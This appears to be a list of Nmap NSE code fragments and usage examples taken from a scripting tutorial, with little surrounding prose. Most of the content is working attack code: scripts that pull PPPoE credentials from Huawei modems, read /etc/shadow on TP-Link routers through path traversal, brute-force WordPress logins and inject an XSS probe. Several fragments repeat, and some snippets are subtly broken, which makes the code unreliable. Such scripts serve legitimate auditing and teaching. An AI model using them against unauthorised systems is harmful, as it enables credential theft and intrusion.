["```\n    description = [[\n    Attempts to detect webcams Trendnet TV-IP110W vulnerable to unauthenticated access to the video stream by querying the URI \"/anony/mjpg.cgi\".\n\n    Original advisory: http://console-cowboys.blogspot.com/2012/01/trendnet-cameras-i-always-feel-like.html\n    ]]\n\n    categories = {\"exploit\",\"vuln\"}\n    ```", "```\n    local http = require \"http\"\n    local shortport = require \"shortport\"\n    local stdnse = require \"stdnse\"\n    ```", "```\n    portrule = shortport.http\n    ```", "```\n    action = function(host, port)\n      local uri = \"/anony/mjpg.cgi\"\n\n      local _, status_404, resp_404 = http.identify_404(host, port)\n      if status_404 == 200 then\n        stdnse.print_debug(1, \"%s: Web server returns ambiguous response. Trendnet webcams return standard 404 status responses. Exiting.\", SCRIPT_NAME)\n        return\n      end\n\n      stdnse.print_debug(1, \"%s: HTTP HEAD %s\", SCRIPT_NAME, uri)\n      local resp = http.head(host, port, uri)\n      if resp.status and resp.status == 200 then\n        return string.format(\"Trendnet TV-IP110W video feed is unprotected:http://%s/anony/mjpg.cgi\", host.ip)\n      end\n    end\n    ```", "```\n    $ nmap -p80 -n -Pn --script http-trendnet-tvip110w.nse <target>\n\n    ```", "```\n    PORT   STATE SERVICE REASON\n    80/tcp open  http    syn-ack\n    |_http-trendnet-tvip110w: Trendnet TV-IP110W video feed is unprotected:http://192.168.4.20/anony/mjpg.cgi\n    ```", "```\nportrule = shortport.http\n```", "```\nLIKELY_HTTP_PORTS = {\n        80, 443, 631, 7080, 8080, 8088, 5800, 3872, 8180, 8000\n}\n\nLIKELY_HTTP_SERVICES = {\n        \"http\", \"https\", \"ipp\", \"http-alt\", \"vnc-http\", \"oem-agent\", \"soap\",\n        \"http-proxy\",\n}\n\nhttp = port_or_service(LIKELY_HTTP_PORTS, LIKELY_HTTP_SERVICES)\n```", "```\nlocal resp = http.head(host, port, uri)\n```", "```\nstdnse.print_debug(<debug level required>, <format string>, arg1, arg2...)  \n```", "```\nlocal status_404, req_404, page_404 = http.identify_404(host, port)\n```", "```\nif http.page_exists(data, req_404, page_404, uri, true) then\n  stdnse.print_debug(1, \"Page exists! \u2192 %s\", uri)\nend\n```", "```\n$ nmap -p80 --script http-google-email -d4 <target>\n\n```", "```\n$ nmap -p80 --script http-sqli-finder --script-args http.useragent=\"Mozilla 42\" <target>\n\n```", "```\noptions = {header={}}\noptions['header']['User-Agent'] = \"Mozilla/9.1 (compatible; Windows NT 5.0 build 1420;)\"\nlocal req = http.get(host, port, uri, options)\n```", "```\n$ nmap -p80 --script http-methods --script-args http.pipeline=25 <target>\n\n```", "```\nlocal reqs = nil\n```", "```\nreqs = http.pipeline_add('/Trace.axd', nil, reqs)\nreqs = http.pipeline_add('/trace.axd', nil, reqs)\nreqs = http.pipeline_add('/Web.config.old', nil, reqs)\n```", "```\nlocal results = http.pipeline(target, 80, reqs)\n```", "```\nfor i, req in pairs(results) do\n  stdnse.print_debug(1, \"Request #%d returned status %d\", I, req.status)\nend\n```", "```\n    description=[[\n    Tries to obtain the PPPoE credentials, MAC address, firmware version and IP information of the aDSL modemsHuawei Echolife 520, 520b, 530 and possibly others by exploiting an information disclosure vulnerability via UDP.\n\n    The script works by sending a crafted UDP packet to port 43690 and then parsing the response that containsthe configuration values. This exploit has been reported to be blocked in some ISPs, in those cases the exploit seems to work fine in local networks.\n    Vulnerability discovered by Pedro Joaquin. No CVE assigned.\n\n    References:\n    * http://www.hakim.ws/huawei/HG520_udpinfo.tar.gz\n    * http://websec.ca/advisories/view/Huawei-HG520c-3.10.18.x-information-disclosure\n    ]]\n    ```", "```\n    local \"stdnse\" = require \"stdnse\"\n    local \"io\" = require \"io\"\n    local \"shortport\" = require \"shortport\"\n    ```", "```\n    portrule = shortport.portnumber(43690, \"udp\", {\"open\", \"open|filtered\",\"filtered\"})\n    ```", "```\n    load_udp_payload = function()\n      local payload_l = nmap.fetchfile(PAYLOAD_LOCATION)\n      if (not(payload_l)) then\n        stdnse.print_debug(1, \"%s:Couldn't locate payload %s\", SCRIPT_NAME, PAYLOAD_LOCATION)\n        return\n      end\n      local payload_h = io.open(payload_l, \"rb\")\n      local payload = payload_h:read(\"*a\")\n      if (not(payload)) then\n        stdnse.print_debug(1, \"%s:Couldn't load payload %s\", SCRIPT_NAME, payload_l)\n        if nmap.verbosity()>=2 then\n          return \"[Error] Couldn't load payload\"\n        end\n        return\n      end\n\n      payload_h:flush()\n      payload_h:close()\n      return payload\n    end\n    ```", "```\n    send_udp_payload = function(ip, timeout, payload)\n      local data\n      stdnse.print_debug(2, \"%s:Sending UDP payload\", SCRIPT_NAME)\n      local socket = nmap.new_socket(\"udp\")\n      socket:set_timeout(tonumber(timeout))\n      local status = socket:connect(ip, HUAWEI_UDP_PORT, \"udp\")\n      if (not(status)) then return end\n      status = socket:send(payload)\n      if (not(status)) then return end\n      status, data = socket:receive()\n      if (not(status)) then\n        socket:close()\n        return\n      end\n      socket:close()\n      return data\n    end\n    ```", "```\n    action = function(host, port)\n      local timeout = stdnse.get_script_args(SCRIPT_NAME..\".timeout\") or 3000\n      local payload = load_udp_payload()\n      local response = send_udp_payload(host.ip, timeout, payload)\n      if response then\n        return parse_resp(response)\n      end\n    end\n    ```", "```\n    # nmap -sU -p43690 --script huawei-hg5xx-udpinfo <target>\n\n    ```", "```\nPORT      STATE         SERVICE REASON\n-- 43690/udp open|filtered unknown no-response\n-- |_huawei5xx-udp-info: |\\x10||||||||<Firmware version>|||||||||||||||||||||||||||||||<MAC addr>|||<Software version>||||||||||||||||||||||||||||||||||||||||||||| <local ip>|||||||||||||||||||<remote ip>||||||||||||||||||<model>|||||||||||||||<pppoe user>|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||<pppoe password>\n```", "```\nportrule = shortport.portnumber(43690, \"udp\", {\"open\", \"open|filtered\",\"filtered\"})\n```", "```\nlocal timeout = stdnse.get_script_args(SCRIPT_NAME..\".timeout\") or 3000\n```", "```\nlocal socket = nmap.new_socket(\"udp\")\nsocket:set_timeout(tonumber(timeout))\nlocal status = socket:connect(ip, HUAWEI_UDP_PORT, \"udp\")\n```", "```\nstatus = socket:send(payload)\n```", "```\nstatus, data = socket:receive()\n```", "```\nlocal socket = nmap.net_socket(\"udp\")\n\u2026\nsocket:close()\n```", "```\nreturn data:gsub(\"%z\", \"|\")\n```", "```\nlocal genericpkt = function(host, port)\n        local pkt = bin.pack(\"H\",\n                \"4500 002c 55d1 0000 8006 0000 0000 0000\" ..\n                \"0000 0000 0000 0000 0000 0000 0000 0000\" ..\n                \"6002 0c00 0000 0000 0204 05b4\"\n        )\n        local tcp = packet.Packet:new(pkt, pkt:len())\n        tcp:ip_set_bin_src(host.bin_ip_src)\n        tcp:ip_set_bin_dst(host.bin_ip)\n        tcp:tcp_set_dport(port)\n        updatepkt(tcp)\n        return tcp\nend\n...\nlocal sock = nmap.new_dnet()\ntry(sock:ip_open())\ntry(sock:ip_send(tcp.buf))\nsock:ip_close()\n```", "```\nlocal catch = function()  socket:close() end\nlocal try = nmap.new_try(catch)\n\u2026\n  try( socket:connect(host, port) )\n  response = try( mysql.receiveGreeting(socket) )\n```", "```\n$ nmap -p80 --script http-google-email -d4 <target>\n\n```", "```\n    description = [[\n    Exploits a directory traversal vulnerability existing in several TP-Link wireless routers. Attackers may exploit this vulnerability to read any of the configuration and password files remotely and without authentication.\n\n    This vulnerability was confirmed in models WR740N, WR740ND and WR2543ND but there are several models that use the same HTTP server so I believe they could be vulnerable as well. I appreciateany help confirming the vulnerability in other models.\n\n    Advisory:\n    * http://websec.ca/advisories/view/path-traversal-vulnerability-tplink-wdr740\n\n    Other interesting files:\n    * /tmp/topology.cnf (Wireless configuration)\n    * /tmp/ath0.ap_bss (Wireless encryption key)\n    ]]\n    ```", "```\n    local http = require \"http\"\n    local io = require \"io\"\n    local shortport = require \"shortport\"\n    local stdnse = require \"stdnse\"\n    local string = require \"string\"\n    local vulns = require \"vulns\"\n    ```", "```\n    portrule = shortport.http\n    ```", "```\n    local function check_vuln(host, port)\n      local evil_uri = \"/help/../../etc/shadow\"\n      stdnse.print_debug(1, \"%s:HTTP GET %s\", SCRIPT_NAME, evil_uri)\n      local response = http.get(host, port, evil_uri)\n      if response.body and response.status==200 and response.body:match(\"root:\") then\n        stdnse.print_debug(1, \"%s:Pattern 'root:' found.\", SCRIPT_NAME, response.body)\n        return true\n      end\n      return false\n    end\n    ```", "```\n    local _, _, rfile_content = string.find(response.body, 'SCRIPT>(.*)')\n    ```", "```\n    $ nmap -p80 --script http-tplink-dir-traversal.nse <target>\n\n    ```", "```\n-- @output\n-- PORT   STATE SERVICE REASON\n-- 80/tcp open  http    syn-ack\n-- | http-tplink-dir-traversal:\n-- |   VULNERABLE:\n-- |   Path traversal vulnerability in several TP-Link wireless routers\n-- |     State: VULNERABLE (Exploitable)\n-- |     Description:\n-- |       Some TP-Link wireless routers are vulnerable to a path traversal vulnerability that allows attackers to read configurations or any other file in the device.\n-- |       This vulnerability can be exploited remotely and without authentication.\n-- |       Confirmed vulnerable models: WR740N, WR740ND, WR2543ND\n-- |       Possibly vulnerable (Based on the same firmware): WR743ND,WR842ND,WA-901ND,WR941N,WR941ND,WR1043ND,MR3220,MR3020,WR841N.\n-- |     Disclosure date: 2012-06-18\n-- |     Extra information:\n-- |       /etc/shadow :\n-- |   \n-- |   root:$1$$zdlNHiCDxYDfeF4MZL.H3/:10933:0:99999:7:::\n-- |   Admin:$1$$zdlNHiCDxYDfeF4MZL.H3/:10933:0:99999:7:::\n-- |   bin::10933:0:99999:7:::\n-- |   daemon::10933:0:99999:7:::\n-- |   adm::10933:0:99999:7:::\n-- |   lp:*:10933:0:99999:7:::\n-- |   sync:*:10933:0:99999:7:::\n-- |   shutdown:*:10933:0:99999:7:::\n-- |   halt:*:10933:0:99999:7:::\n-- |   uucp:*:10933:0:99999:7:::\n-- |   operator:*:10933:0:99999:7:::\n-- |   nobody::10933:0:99999:7:::\n-- |   ap71::10933:0:99999:7:::\n-- |   \n-- |     References:\n-- |_      http://websec.ca/advisories/view/path-traversal-vulnerability-tplink-wdr740\n```", "```\nlocal response = http.get(host, port, \"/help/../../../etc/shadow\")\n```", "```\nif response.body and response.status==200 and response.body:match(\"root:\") then\n    stdnse.print_debug(1, \"%s:Pattern 'root:' found.\", SCRIPT_NAME, response.body)\n    return true\n  end\n```", "```\nlocal _, _, rfile_content = string.find(response.body, 'SCRIPT>(.*)')\n```", "```\nlocal vuln = {\n       title = 'Path traversal vulnerability in several TP-Link wireless routers',\n       state = vulns.STATE.NOT_VULN,\n       description = [[\nSome TP-Link wireless routers are vulnerable to a path traversal vulnerability that allows attackers to read configurations or any other file in the device.\nThis vulnerability can be exploited without authentication.Confirmed vulnerable models: WR740N, WR740ND, WR2543ND\nPossibly vulnerable (Based on the same firmware): WR743ND,WR842ND,WA-901ND,WR941N,WR941ND,WR1043ND,MR3220,MR3020,WR841N.]],\n       references = {\n           'http://websec.ca/advisories/view/path-traversal-vulnerability-tplink-wdr740'\n       },\n       dates = {\n           disclosure = {year = '2012', month = '06', day = '18'},       },\n  }\n  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)\n```", "```\nSTATE_MSG = {\n  [STATE.LIKELY_VULN] = 'LIKELY VULNERABLE',\n  [STATE.NOT_VULN] = 'NOT VULNERABLE',\n  [STATE.VULN] = 'VULNERABLE',\n  [STATE.DoS] = 'VULNERABLE (DoS)',\n  [STATE.EXPLOIT] = 'VULNERABLE (Exploitable)',\n  [bit.bor(STATE.DoS,STATE.VULN)] = 'VUNERABLE (DoS)',\n  [bit.bor(STATE.EXPLOIT,STATE.VULN)] = 'VULNERABLE (Exploitable)',\n}\n```", "```\nlocal vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)\nlocal vuln = { title = \"VULN TITLE\", ...}\n\u2026\nvuln.state = vulns.STATE.EXPLOIT\n\u2026\nvuln_report:make_output(vuln)\n```", "```\nlocal traversals = {\"../\", \"%2f\"}\n\n```", "```\n$ nmap -p80 --script http-google-email -d4 <target>\n\n```", "```\n$ nmap -p80 --script http-sqli-finder --script-args http.useragent=\"Mozilla 42\" <target>\n\n```", "```\noptions = {header={}}\noptions['header']['User-Agent'] = \"Mozilla/9.1 (compatible; Windows NT 5.0 build 1420;)\"\nlocal req = http.get(host, port, uri, options)\n```", "```\n$ nmap -p80 --script http-methods --script-args http.pipeline=25 <target>\n\n```", "```\nlocal reqs = nil\n```", "```\nreqs = http.pipeline_add('/Trace.axd', nil, reqs)\nreqs = http.pipeline_add('/trace.axd', nil, reqs)\nreqs = http.pipeline_add('/Web.config.old', nil, reqs)\n```", "```\nlocal results = http.pipeline(target, 80, reqs)\n```", "```\nfor i, req in pairs(results) do\n  stdnse.print_debug(1, \"Request #%d returned status %d\", I, req.status)\nend\n```", "```\n    description = [[\n    performs brute force password auditing against Wordpress CMS/blog installations.\n\n    This script uses the unpwdb and brute libraries to perform password guessing. Any successful guesses arestored using the credentials library.\n\n    Wordpress default uri and form names:\n    * Default uri:<code>wp-login.php</code>\n    * Default uservar: <code>log</code>\n    * Default passvar: <code>pwd</code>\n    ]]\n    author = \"Paulino Calderon <calderon()websec.mx>\"\n    license = \"Same as Nmap--See http://nmap.org/book/man-legal.html\"\n    categories = {\"intrusive\", \"brute\"}\n    ```", "```\n    local brute = require \"brute\"\n    local creds = require \"creds\"\n    local http = require \"http\"\n    local shortport = require \"shortport\"\n    local stdnse = require \"stdnse\"\n    ```", "```\n    Driver = {\n      new = function(self, host, port, options)\n      ...\n      end,\n      check = function(self)\n      ...\n      end\n      login = function(self)\n      ...\n      end\n      connect = function(self)\n      ...\n      end\n      disconnect = function(self)\n      ...\n      end\n    }\n    ```", "```\n                new = function(self, host, port, options)\n                    local o = {}\n                    setmetatable(o, self)\n                    self.__index = self\n                    o.host = stdnse.get_script_args('http-wordpress-brute.hostname') or host\n                    o.port = port\n                    o.uri = stdnse.get_script_args('http-wordpress-brute.uri') or DEFAULT_WP_URI\n                    o.options = options\n                    return o\n                  end,\n        ```", "```\n                 connect = function( self )\n                    return true\n                  end,\n        ```", "```\n                disconnect = function( self )\n                    return true\n                  end,\n        ```", "```\n                  check = function( self )\n                    local response = http.get( self.host, self.port, self.uri )\n                    stdnse.print_debug(1, \"HTTP GET %s%s\", stdnse.get_hostname(self.host),self.uri)\n                    -- Check if password field is there\n                    if ( response.status == 200 and response.body:match('type=[\\'\"]password[\\'\"]')) then\n                      stdnse.print_debug(1, \"Initial check passed. Launching brute force attack\")\n                      return true\n                    else\n                      stdnse.print_debug(1, \"Initial check failed. Password field wasn't found\")\n                    end\n\n                    return false\n        ```", "```\n                 login = function( self, username, password )\n                    -- Note the no_cache directive\n                    stdnse.print_debug(2, \"HTTP POST %s%s\\n\", self.host, self.uri)\n                    local response = http.post( self.host, self.port, self.uri, { no_cache = true }, nil, { [self.options.uservar] = username, [self.options.passvar] = password } )\n                        -- This redirect is taking us to /wp-admin\n                    if response.status == 302 then\n                      local c = creds.Credentials:new( SCRIPT_NAME, self.host, self.port )\n                      c:add(username, password, creds.State.VALID )\n                      return true, brute.Account:new( username, password, \"OPEN\")\n                    end\n\n                    return false, brute.Error:new( \"Incorrect password\" )\n                  end,\n        ```", "```\n            action = function( host, port )\n              local status, result, engine\n              local uservar = stdnse.get_script_args('http-wordpress-brute.uservar') or DEFAULT_WP_USERVAR\n              local passvar = stdnse.get_script_args('http-wordpress-brute.passvar') or DEFAULT_WP_PASSVAR\n              local thread_num = stdnse.get_script_args(\"http-wordpress-brute.threads\") or DEFAULT_THREAD_NUM\n\n              engine = brute.Engine:new( Driver, host, port, { uservar = uservar, passvar = passvar } )\n              engine:setMaxThreads(thread_num)\n              engine.options.script_name = SCRIPT_NAME\n              status, result = engine:start()\n\n              return result\n            end\n    ```", "```\nDriver:login = function( self, username, password )\nDriver:check = function( self ) [Deprecated]\nDriver:connect = function( self )\nDriver:disconnect = function( self )\n```", "```\nbrute.Account:new( username, password, \"OPEN\")\n```", "```\nlocal c = creds.Credentials:new( SCRIPT_NAME, self.host, self.port )\n      c:add(username, password, creds.State.VALID )\n```", "```\n$ nmap -p80 --script http-wordpress-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt <target>\n\n```", "```\n$ nmap -p80 --script http-wordpress-brute --script-args brute.firstOnly <target>\n\n```", "```\n$ nmap -p80 --script http-wordpress-brute --script-args unpwdb.timelimit=0 <target>\n$ nmap -p80 --script http-wordpress-brute --script-args unpwdb.timelimit=60m <target>\n\n```", "```\n$ nmap -p80 --script http-google-email -d4 <target>\n\n```", "```\nlocal catch = function()  socket:close() end\nlocal try = nmap.new_try(catch)\n\u2026\n  try( socket:connect(host, port) )\n  response = try( mysql.receiveGreeting(socket) )\n```", "```\n    $ nmap --script http-wordpress-brute --script-args brute.mode=user <target>\n\n    ```", "```\n    $ nmap --script http-wordpress-brute --script-args brute.mode=pass <target>\n\n    ```", "```\n    $ nmap --script http-wordpress-brute --script-args brute.mode=creds,brute.credfile=./creds.txt <target>\n\n    ```", "```\n    description=[[\n    Crawls a web server and attempts to find PHP files vulnerable to reflected cross site scripting via the variable $_SERVER[\"PHP_SELF\"].\n\n    This script crawls the web server to create a list of PHP files and then sends an attack vector/probe to identify PHP_SELF cross site scripting vulnerabilities.\n    PHP_SELF XSS refers to reflected cross site scripting vulnerabilities caused by the lack of sanitation of the variable <code>$_SERVER[\"PHP_SELF\"]</code> in PHP scripts. This variable iscommonly used in php scripts that display forms and when the script file name  is needed.\n\n    Examples of Cross Site Scripting vulnerabilities in the variable $_SERVER[PHP_SELF]:\n    *http://www.securityfocus.com/bid/37351\n    *http://software-security.sans.org/blog/2011/05/02/spot-vuln-percentage\n    *http://websec.ca/advisories/view/xss-vulnerabilities-mantisbt-1.2.x\n\n    The attack vector/probe used is: <code>/'\"/><script>alert(1)</script></code>\n    ]]\n    author = \"Paulino Calderon <calderon()websec.mx>\"\n    license = \"Same as Nmap--See http://nmap.org/book/man-legal.html\"\n    categories = {\"fuzzer\", \"intrusive\", \"vuln\"}\n    ```", "```\n    local http = require 'http'\n    local httpspider = require 'httpspider'\n    local shortport = require 'shortport'\n    local url = require 'url'\n    local stdnse = require 'stdnse'\n    local vulns = require 'vulns'\n    ```", "```\n    portrule = shortport.http\n    ```", "```\n    local PHP_SELF_PROBE = '/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E'\n    local probes = {}\n    local function launch_probe(host, port, uri)\n      local probe_response\n      --We avoid repeating probes.\n      --This is a temp fix since httpspider do not keep track of previously parsed links at the moment.\n      if probes[uri] then\n        return false\n      end\n\n      stdnse.print_debug(1, \"%s:HTTP GET %s%s\", SCRIPT_NAME, uri, PHP_SELF_PROBE)\n      probe_response = http.get(host, port, uri .. PHP_SELF_PROBE)\n\n      --save probe in list to avoid repeating it\n      probes[uri] = true\n\n      if check_probe_response(probe_response) then\n        return true\n      end\n      return false\n    end\n    ```", "```\n    local function check_probe_response(response)\n      stdnse.print_debug(3, \"Probe response:\\n%s\", response.body)\n      if string.find(response.body, \"'\\\"/><script>alert(1)</script>\", 1, true) ~= nil then\n        return true\n      end\n      return false\n    end\n    ```", "```\n    action = function(host, port)\n      local uri = stdnse.get_script_args(SCRIPT_NAME..\".uri\") or \"/\"\n      local timeout = stdnse.get_script_args(SCRIPT_NAME..'.timeout') or 10000\n      local crawler = httpspider.Crawler:new(host, port, uri, { scriptname = SCRIPT_NAME } )\n      crawler:set_timeout(timeout)\n\n      local vuln = {\n           title = 'Unsafe use of $_SERVER[\"PHP_SELF\"] in PHP files',\n           state = vulns.STATE.NOT_VULN,\n           description = [[\n    PHP files are not handling safely the variable $_SERVER[\"PHP_SELF\"] causing Reflected Cross Site Scripting vulnerabilities.\n           ]],\n           references = {\n               'http://php.net/manual/en/reserved.variables.server.php',\n               'https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)'\n           }\n         }\n      local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)\n\n      local vulnpages = {}\n      local probed_pages= {}\n\n      while(true) do\n        local status, r = crawler:crawl()\n        if ( not(status) ) then\n          if ( r.err ) then\n            return stdnse.format_output(true, \"ERROR: %s\", r.reason)\n          else\n            break\n          end\n        end\n\n        local parsed = url.parse(tostring(r.url))\n\n        --Only work with .php files\n        if ( parsed.path and parsed.path:match(\".*.php\") ) then\n            --The following port/scheme code was seen in http-backup-finder and its neat =)\n            local host, port = parsed.host, parsed.port\n            if ( not(port) ) then\n              port = (parsed.scheme == 'https') and 443\n              port = port or ((parsed.scheme == 'http') and 80)\n            end\n            local escaped_link = parsed.path:gsub(\" \", \"%%20\")\n            if launch_probe(host,port,escaped_link) then\n              table.insert(vulnpages, parsed.scheme..'://'..host..escaped_link..PHP_SELF_PROBE)\n            end\n          end\n      end\n\n      if ( #vulnpages > 0 ) then\n        vuln.state = vulns.STATE.EXPLOIT\n        vulnpages.name = \"Vulnerable files with proof of concept:\"\n        vuln.extra_info = stdnse.format_output(true, vulnpages)..crawler:getLimitations()\n      end\n\n      return vuln_report:make_output(vuln)\n\n    end\n    ```", "```\n    $ nmap -p80 --script http-phpself-xss.nse <target>\n\n    ```", "```\n    PORT   STATE SERVICE REASON\n    80/tcp open  http    syn-ack\n     http-phpself-xss:\n       VULNERABLE:\n       Unsafe use of $_SERVER[\"PHP_SELF\"] in PHP files\n         State: VULNERABLE (Exploitable)\n         Description:\n           PHP files are not handling safely the variable $_SERVER[\"PHP_SELF\"] causing Reflected Cross Site Scripting vulnerabilities.\n\n         Extra information:\n\n       Vulnerable files with proof of concept:\n         http://calder0n.com/sillyapp/three.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E\n         http://calder0n.com/sillyapp/secret/2.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E\n         http://calder0n.com/sillyapp/1.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E\n         http://calder0n.com/sillyapp/secret/1.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E\n       Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=calder0n.com\n         References:\n           https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)\n          http://php.net/manual/en/reserved.variables.server.php\n    ```", "```\nlocal timeout = stdnse.get_script_args(SCRIPT_NAME..'.timeout') or 10000\nlocal crawler = httpspider.Crawler:new(host, port, uri, { scriptname = SCRIPT_NAME } )\ncrawler:set_timeout(timeout)\n```", "```\nwhile(true) do\n    local status, r = crawler:crawl()\n    local parsed = url.parse(tostring(r.url))\n    if ( parsed.path and parsed.path:match(\".*.php\") ) then\n    \u2026\n    end\nend\n```", "```\nlocal PHP_SELF_PROBE = '/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E'\nprobe_response = http.get(host, port, uri .. PHP_SELF_PROBE)\n```", "```\nif string.find(response.body, \"'\\\"/><script>alert(1)</script>\", 1, true) ~= nil then\n    return true\n  end\n  return false\n```", "```\nif ( #vulnpages > 0 ) then\n    vuln.state = vulns.STATE.EXPLOIT\n    vulnpages.name = \"Vulnerable files with proof of concept:\"\n    vuln.extra_info = stdnse.format_output(true, vulnpages)..crawler:getLimitations()\nend\n\nreturn vuln_report:make_output(vuln)\n```", "```\nSpidering limited to: maxdepth=3; maxpagecount=20; withinhost=scanme.nmap.org\n```", "```\n$ nmap -p80 --script http-google-email -d4 <target>\n\n```", "```\n$ nmap -p80 --script http-sqli-finder --script-args http.useragent=\"Mozilla 42\" <target>\n\n```", "```\noptions = {header={}}\noptions['header']['User-Agent'] = \"Mozilla/9.1 (compatible; Windows NT 5.0 build 1420;)\"\nlocal req = http.get(host, port, uri, options)\n```", "```\n$ nmap -p80 --script http-methods --script-args http.pipeline=25 <target>\n\n```", "```\nlocal reqs = nil\n```", "```\nreqs = http.pipeline_add('/Trace.axd', nil, reqs)\nreqs = http.pipeline_add('/trace.axd', nil, reqs)\nreqs = http.pipeline_add('/Web.config.old', nil, reqs)\n```", "```\nlocal results = http.pipeline(target, 80, reqs)\n```", "```\nfor i, req in pairs(results) do\n  stdnse.print_debug(1, \"Request #%d returned status %d\", I, req.status)\nend\n```", "```\nlocal catch = function()  socket:close() end\nlocal try = nmap.new_try(catch)\n\u2026\n  try( socket:connect(host, port) )\n  response = try( mysql.receiveGreeting(socket) )\n```", "```\n    local vulns = require \"vulns\"\n    ```", "```\n    local vuln = { title = \"<TITLE GOES HERE>\",\n                   state = vulns.STATE.NOT_VULN,\n                 references = {\"<URL1>\", \"URL2\"},\n                   description = [[<DESCRIPTION GOES HERE> ]],\n                   IDS = {CVE = \"<CVE ID>\", BID = \"BID ID\"},\n                   risk_factor = \"High/Medium/Low\" }\n    ```", "```\n    local vuln_report = new vulns.Report:new(SCRIPT_NAME, host, port)\n    return vuln_report:make_output(vuln)\n    ```", "```\n    PORT   STATE SERVICE REASON\n    80/tcp open  http    syn-ack\n     http-vuln-cve2012-1823:\n       VULNERABLE:\n       PHP-CGI Remote code execution and source code disclosure\n         State: VULNERABLE (Exploitable)\n         IDs:  CVE:2012-1823\n         Description:\n           According to PHP's website, \"PHP is a widely-used general-purpose\n           scripting language that is especially suited for Web development and\n           can be embedded into HTML.\" When PHP is used in a CGI-based setup\n           (such as Apache's mod_cgid), the php-cgi receives a processed query\n           string parameter as command line arguments which allows command-line\n           switches, such as -s, -d or -c to be passed to the php-cgi binary,\n           which can be exploited to disclose source code and obtain arbitrary\n           code execution.\n         Disclosure date: 2012-05-3\n         Extra information:\n           Proof of Concept:/index.php?-s\n         References:\n           http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/\n           http://cve.mitre.org/cgi-bin/cvename.cgi?name=2012-1823\n          http://ompldr.org/vZGxxaQ\n    ```", "```\nlocal vuln = { title = \"<TITLE GOES HERE>\", state = vulns.STATE.NOT_VULN, ... }\n```", "```\nlocal vuln_report = new vulns.Report:new(SCRIPT_NAME, host, port)\n```", "```\nreturn vuln_report:make_output(vuln)\n```", "```\n# nmap -sV --script vuln --script-args vulns.showall <target>\n\n```", "```\n| http-vuln-cve2011-3192:\n|   VULNERABLE:\n|   Apache byterange filter DoS\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2011-3192  OSVDB:74721\n|     Description:\n|       The Apache web server is vulnerable to a denial of service attack when numerous\n|       overlapping byte ranges are requested.\n|     Disclosure date: 2011-08-19\n|     References:\n|       http://nessus.org/plugins/index.php?view=single&id=55976\n|       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192\n|       http://osvdb.org/74721\n|_      http://seclists.org/fulldisclosure/2011/Aug/175\n| http-vuln-cve2011-3368:\n|   NOT VULNERABLE:\n|   Apache mod_proxy Reverse Proxy Security Bypass\n|     State: NOT VULNERABLE\n|     IDs:  CVE:CVE-2011-3368  OSVDB:76079\n|     References:\n|       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3368\n|_      http://osvdb.org/76079\n```", "```\nSTATE_MSG = {\n  [STATE.LIKELY_VULN] = 'LIKELY VULNERABLE',\n  [STATE.NOT_VULN] = 'NOT VULNERABLE',\n  [STATE.VULN] = 'VULNERABLE',\n  [STATE.DoS] = 'VULNERABLE (DoS)',\n  [STATE.EXPLOIT] = 'VULNERABLE (Exploitable)',\n  [bit.bor(STATE.DoS,STATE.VULN)] = 'VUNERABLE (DoS)',\n  [bit.bor(STATE.EXPLOIT,STATE.VULN)] = 'VULNERABLE (Exploitable)',\n}\n```", "```\n    local math = require \"math\"\n    ```", "```\n    function hello_word()\n      return \"Hello World!\"\n    end\n    ```", "```\n    local mylibrary = require \"mylibrary\"\n    ```", "```\n    mylibrary.hello_world()\n    ```", "```\n--hello.lua\nlocal stdnse = require \"stdnse\"\nfunction hello(msg, name)\n   return stdnse.format(\"%s %s\", msg, name)\nend\n```", "```\nlocal hello = require \"hello\"\n...\nhello.foo()\n```", "```\n$ nmap -p80 --script http-google-email -d4 <target>\n\n```", "```\nlocal catch = function()  socket:close() end\nlocal try = nmap.new_try(catch)\n\u2026\n  try( socket:connect(host, port) )\n  response = try( mysql.receiveGreeting(socket) )\n```", "```\n    local co = stdnse.new_thread(worker_main_function, arg1, arg2, arg3, ...)\n    ```", "```\n    local my_mutex = nmap.mutex(object)\n    ```", "```\n    my_mutex(\"trylock\")\n    ```", "```\n    my_mutex(\"done\")\n    ```", "```\n    local o = {} \n    local my_condvar = nmap.condvar(o)\n    ```", "```\n    my_condvar(\"signal\")\n    ```", "```\nlocal co = stdnse.new_thread(worker_main_function, arg1, arg2, arg3, ...)\n```", "```\n$ nmap -p80 --script http-google-email -d4 <target>\n\n```", "```\nlocal catch = function()  socket:close() end\nlocal try = nmap.new_try(catch)\n\u2026\n  try( socket:connect(host, port) )\n  response = try( mysql.receiveGreeting(socket) )\n```"]